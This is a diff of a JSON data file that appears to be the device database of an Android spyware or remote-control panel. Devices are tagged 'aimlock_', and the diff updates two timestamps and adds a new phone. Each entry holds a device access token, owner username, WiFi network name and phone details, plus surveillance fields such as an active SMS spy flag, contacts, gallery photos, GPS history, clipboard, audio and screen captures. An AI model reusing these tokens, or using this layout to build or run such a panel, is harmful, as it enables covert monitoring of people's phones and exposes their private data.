@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776845743910,
+    "lastSeen": 1776845757411,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -5996,7 +5996,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "e0d08160e2e7174ce4ecac4f3a5a0002",
-    "lastSeen": 1776845745300,
+    "lastSeen": 1776845757253,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T08:12:20.623Z",
@@ -7888,5 +7888,37 @@
       "mimeType": "video/mp4",
       "startedAt": 1776845634342
     }
+  },
+  {
+    "deviceId": "aimlock_0919c762",
+    "deviceName": "HP-RRR-85A1",
+    "ownerUsername": "raditcees",
+    "token": "e2902cd1fd42dda19cd9db366e0d73a3",
+    "lastSeen": 1776845758181,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-22T08:15:58.181Z",
+    "deviceInfo": {
+      "model": "samsung SM-A217F",
+      "androidVersion": "Android 12",
+      "battery": 73,
+      "network": "WiFi: HUAWEI-Bz5c",
+      "sim1": "Hanya panggilan darurat",
+      "sim2": "Hanya panggilan darurat"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
